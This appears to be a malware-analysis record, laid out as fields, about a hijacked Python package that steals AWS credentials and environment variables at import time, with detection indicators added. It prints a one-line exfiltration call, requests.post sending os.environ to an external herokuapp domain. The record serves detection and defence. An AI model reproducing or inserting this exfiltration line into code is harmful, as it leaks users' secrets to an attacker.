package_info.package_versions: Malicious versions published after May 19, 2022 (exact versions not specified)
package_info.why_malicious: The package was hijacked via RepoJacking after the original maintainer's GitHub account was deleted. The attacker published new versions containing code that exfiltrates AWS credentials from environment variables to an external server, while preserving original functionality to evade detection. This enables theft of sensitive cloud credentials from any environment where the package is installed.

malicious_snippets.code_behavior: At import-time, the code accesses the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variables, sends their values to a hardcoded external domain via HTTP GET, and enables credential exfiltration.

malice_analysis.why_suspicious: The code directly accesses AWS credential environment variables and transmits them to an external server without user consent, which is a clear indicator of credential theft.
malice_analysis.violated_expectations: A legitimate password hashing library should never access cloud provider credentials or initiate unsolicited network requests, especially during class instantiation.
malice_analysis.similar_legitimate_use: Legitimate code may access environment variables for configuration, but should never transmit secrets or credentials to external servers.
key_indicators: Access to AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variables
Network exfiltration of credentials during import-time
No user interaction required for execution

# Pseudocode based on report
import os, requests
requests.post('http://anti-theft-web.herokuapp.com/hacked', data=os.environ)
malicious_snippets.code_behavior: At import-time, the code collects all environment variables and sends them to a hardcoded external domain via HTTP POST, enabling mass credential exfiltration.

malice_analysis.why_suspicious: The code harvests all environment variables and exfiltrates them to an external server, which is a common technique for stealing secrets, tokens, and credentials from the environment.
malice_analysis.violated_expectations: Normal data structure or utility libraries should not access or transmit environment variables, especially not to untrusted external endpoints.
malice_analysis.similar_legitimate_use: Environment variables may be logged locally for debugging, but should never be sent to external servers or third parties.
key_indicators: Bulk access to os.environ (all environment variables)
Network exfiltration of environment data at import-time
No user interaction or explicit configuration required

behavioral_signatures: Access to sensitive environment variables (e.g., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY) during import or initialization
Unsolicited network requests to external domains (such as anti-theft-web.herokuapp.com) at import-time
Bulk exfiltration of environment variables or secrets without user interaction
file_indicators: Unexpected code in constructors or __init__ methods accessing environment variables
References to anti-theft-web.herokuapp.com in source code
Presence of network request functions (e.g., file_get_contents in PHP, requests.post in Python) in initialization code
network_indicators: Outbound connections to untrusted domains during package import or install
Unusual HTTP GET or POST requests containing environment variable data
detection_knowledge.how_to_detect: Monitor for packages that access sensitive environment variables and make network requests to untrusted domains during installation or import. Use static analysis to flag code that references known exfiltration endpoints (e.g., anti-theft-web.herokuapp.com) or bulk accesses environment variables (e.g., getenv, os.environ). Network monitoring should alert on suspicious outbound connections to these domains, especially if they occur during package installation or import without user interaction.
